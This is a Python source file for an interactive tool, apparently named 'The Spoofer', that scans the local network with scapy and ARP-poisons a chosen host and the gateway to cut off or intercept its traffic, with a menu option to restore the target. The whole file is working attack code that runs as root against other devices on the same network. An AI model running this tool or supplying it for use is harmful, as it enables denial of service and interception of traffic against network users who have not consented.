
"""
ip = get_if_addr(conf.iface)  # conf.iface = default interface
ip = get_if_addr("eth0")
ip
'10.0.0.5'
"""


"""
mac = get_if_hwaddr(conf.iface)  # conf.iface = default interface
mac = get_if_hwaddr("eth0")
mac
'54:3f:19:c9:38:6d'
"""

""

"""
conf.route.route("127.0.0.1")
('lo', '127.0.0.1', '0.0.0.0')

(interface, outgoing_ip, gateway)
"""


"""
mac = getmacbyip("10.0.0.1")
mac
'f3:ae:5e:76:31:9b'
"""



BANNER = """

████████╗██╗  ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
   ██║   ███████║█████╗      ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
   ██║   ██╔══██║██╔══╝      ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
   ██║   ██║  ██║███████╗    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                                       

"""

from os import getuid, name, _exit
from colorama import *
from tqdm import tqdm

RED = Fore.RED
LIGHTBLUE = Fore.LIGHTBLUE_EX
LIGHTYELLOW = Fore.LIGHTYELLOW_EX
LIGHTGREEN = Fore.LIGHTGREEN_EX
BOLD = Style.BRIGHT
RST = Style.RESET_ALL
HOSTS = {}
AGENTS = {}
INTERVAL=1 
MAX_THREADS = 150
print(BANNER)
def error(err:str):
	print(f"{RED}{BOLD}[-] {err}{RST}")
def warn(warning:str):
	print(f"{LIGHTYELLOW}{BOLD}[!] {warning}{RST}")
def success(message:str):
	print(f"{LIGHTGREEN}{BOLD}[+] {message}{RST}")
def userSelection(prompt) -> int:
	hostID = -1
	while hostID < 1 or hostID > len(HOSTS):
		try:
			hostID = int(input(prompt))
		except KeyboardInterrupt:
			raise Exception("User interrupt")
		except:
			pass	
	return hostID
if getuid() != 0:
	error("Run it as root! Exiting...")
	exit(0)
if name != "posix":
	error("You must be run this on linux")
	exit(0)
import netifaces as ni
from scapy.all import *
from netaddr import IPAddress, IPNetwork
from concurrent.futures import ThreadPoolExecutor
import threading
def getIPNetwork(addr:str, subnet:str):
	return IPNetwork(f"{addr}/{IPAddress(subnet).netmask_bits()}")
def getMaxHostNumbers(addr:str, subnet:str):
	return getIPNetwork(addr, subnet).size
def getNetworkID(addr:str, subnet:str):
	return str(getIPNetwork(addr, subnet).network)
def get_dns_resolvers():
	def is_valid_ipv4_address(ip):
		try:
			return len(ip.split(".")) == 4 and len( list(filter(lambda x : int(x)<256 and int(x)>=0, ip.split("."))) ) == 4
		except: 
			return False
	dns_ips = []
	with open('/etc/resolv.conf') as fp:
		for _, line in enumerate(fp):
			columns = line.split()
			if columns[0] == 'nameserver':
				ip = columns[1:][0]
				if is_valid_ipv4_address(ip):
					dns_ips.append(ip)
				else: return None
	return dns_ips
def printNetInfos():
	infos = IFACE_IPv4_INFOS
	max = len(list(infos.items())[0][0])
	for item in list(infos.items()):
		if len(item[0]) > max:
			max = len(item[0])
	for item in list(infos.items()):
		print(f"{LIGHTYELLOW}{BOLD}", end="")
		print(f"{item[0]}{(' ' * (max-len(item[0])) )} : ", end="")
		if type(item[1]) == list:
			
			for i, item in enumerate(item[1]):
				if i!=0: print(" - ", end="")
				print(f"{item}", end="")
			continue
		print(f"{item[1]}") 
	print(f"{RST}\n\n")
def scan():
	EXCLUDED_ADDRESSES = [ IFACE_IPv4_INFOS["Your Address"] ]

	def worker(ip):
		ip = str(ip)
		mac = getmacbyip(ip)
		if mac:
			return ip, mac
		return None, None
	network = getIPNetwork(IFACE_IPv4_INFOS["Your Address"], IFACE_IPv4_INFOS["Netmask"])
	iprange = list(network.iter_hosts())
	for excludedAddr in EXCLUDED_ADDRESSES:
		try:
			iprange.remove(IPAddress(excludedAddr))
		except:
			pass
	with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
		iterator = tqdm(
		        iterable=executor.map(worker, iprange),
		        total=len(iprange),
		        ncols=45,
		        bar_format='{percentage:3.0f}% {bar} {n_fmt}/{total_fmt}'
            	)
		for ip, mac in iterator:
			if mac and ip:
				HOSTS.update( { ip:{"MAC": mac, "Blocked": HOSTS.get(ip, HOSTS).get("Blocked", False), "isGateway" : (ip == IFACE_IPv4_INFOS["Gateway IP"])} } )
		print()
		success(str(len(HOSTS)) + " host(s) found!")
def hosts():
	if len(HOSTS) == 0:
		warn("No host found yet, scanning...\n")
		scan()
		print("\n")
	
	entrylen = 30
	for i, ip_dict in enumerate(HOSTS.items()):
		host_ip = ip_dict[0]
		host_blocked = ip_dict[1]["Blocked"]
		isGateway = ip_dict[1]["isGateway"]
		host_mac = ip_dict[1]["MAC"]
		
		color = RED if host_blocked else LIGHTGREEN
		
		print(f"{color}[{i+1}] " + host_ip + " " * (entrylen-len(host_ip)) + host_mac, end="")
		
		if isGateway:
			print(f" {BOLD}(Gateway)", end="")
		print(f"{RST}")
			
		
	print()
	

		
def arp_spoof_worker(hostID):
	targetIP, targetInfos = list(HOSTS.items())[hostID-1]
	targetMAC = targetInfos["MAC"]
	gatewayIP = IFACE_IPv4_INFOS["Gateway IP"]
	gatewayMAC = IFACE_IPv4_INFOS["Gateway MAC"]
	yourMAC = IFACE_IPv4_INFOS["Your MAC"]
	HostPacket = Ether(dst=targetMAC, src=gatewayMAC)/ARP(op=2, pdst=targetIP, hwdst=targetMAC, 
								hwsrc=yourMAC, psrc=gatewayIP) 							
	GatewayPacket = Ether(dst=gatewayMAC)/ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC,
								hwsrc=yourMAC, psrc=targetIP) 

	
	t = threading.current_thread()
	while getattr(t, "run", True):
		sendp(HostPacket, iface=IFACE_IPv4_INFOS["interface"], inter=INTERVAL, verbose=False)
		sendp(GatewayPacket, iface=IFACE_IPv4_INFOS["interface"], verbose=False)
def arp_spoof():
	hosts()
	try:
		hostID = userSelection("Choose host to poison > ")
	except:
		return
	targetIP, _ = list(HOSTS.items())[hostID-1]
	if HOSTS[targetIP]["Blocked"]:
		error("Host is already blocked")
		return
	try:
		t=threading.Thread(target=arp_spoof_worker, args=(hostID,), daemon=True)
		t.start()	
		HOSTS[targetIP]["Blocked"] = True
	except:
		HOSTS[targetIP]["Blocked"] = False
	t.run = HOSTS[targetIP]["Blocked"]
	AGENTS.update({targetIP : t})
def unlock():		
	hosts()
	try:
		hostID = userSelection("Choose host to free > ")
	except:
		return
	targetIP, _ = list(HOSTS.items())[hostID-1]
	if not HOSTS[targetIP]["Blocked"]:
		error("Host is already freed")
		return
	HOSTS[targetIP]["Blocked"] = False
	AGENTS[targetIP].run = HOSTS[targetIP]["Blocked"]
	AGENTS.pop(targetIP)
	targetIP, targetInfos = list(HOSTS.items())[hostID-1]
	targetMAC = targetInfos["MAC"]
	gatewayIP = IFACE_IPv4_INFOS["Gateway IP"]
	gatewayMAC = IFACE_IPv4_INFOS["Gateway MAC"]
	HostPacket = Ether(src=gatewayMAC, dst=targetMAC)/ARP(op=2, pdst=targetIP, hwdst=targetMAC, 
							hwsrc=gatewayMAC, psrc=gatewayIP)
	for i in range(5):
		sendp(HostPacket, iface=IFACE_IPv4_INFOS["interface"], verbose=False)
FUNCS = [
	("exit", lambda: os._exit(0)),
	("network infos", printNetInfos),
	("scan active hosts", scan),
	("show hosts", hosts),
	("block (ARP poison)", arp_spoof),
	("Unlock", unlock)
]
def menu():
	maxChoice = len(FUNCS)
	print(f"{LIGHTBLUE}{BOLD}", end="")
	for i, funcTuple in enumerate(FUNCS):
		print(f"[{i}] {funcTuple[0]}")
		
	
	choice = -1
	
	
	try:
		choice=int(input(f">{RST} "))
		
		if (choice >= maxChoice) or (choice < 0):
			raise Exception("Invalid input")
		
		_, funRef = FUNCS[choice]
		
		print()
		funRef()
		print("\n")
		
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print()
		warn(e)
		print()
		



IFACE = conf.iface 
IFACE_NAME = IFACE.name 

try:
	IFACE_IPv4 = ni.ifaddresses(IFACE_NAME)[ni.AF_INET][0]
	IFACE_IPv4_MAC = ni.ifaddresses(IFACE_NAME)[ni.AF_LINK][0]["addr"]
	
	IFACE_IPv4_GATEWAY = ni.gateways()["default"][ni.AF_INET][0]  
	IFACE_IPv4_GATEWAY_MAC = getmacbyip(IFACE_IPv4_GATEWAY)
	
	DNS_SRVS = get_dns_resolvers() or "No DNS resolver found"
	
except:
	error("No network interface found")
	exit(0)




try:
	IFACE_IPv4_INFOS = {
		"interface": IFACE_NAME,
		"Network": getNetworkID(IFACE_IPv4["addr"], IFACE_IPv4["netmask"]),
		"Broadcast": IFACE_IPv4["broadcast"],
		"Netmask": IFACE_IPv4["netmask"],
		"Gateway IP": IFACE_IPv4_GATEWAY,
		"Gateway MAC": IFACE_IPv4_GATEWAY_MAC,
		"Your Address" : IFACE_IPv4["addr"],
		"Your MAC": IFACE_IPv4_MAC,
		"Addressable hosts" : getMaxHostNumbers(IFACE_IPv4["addr"], IFACE_IPv4["netmask"]),
		"DNS Resolver(s)" : DNS_SRVS
	}
except Exception as e:
	error("No default network interface appears to be found. Exiting...")
	exit(0)


printNetInfos()

while True:
	menu()

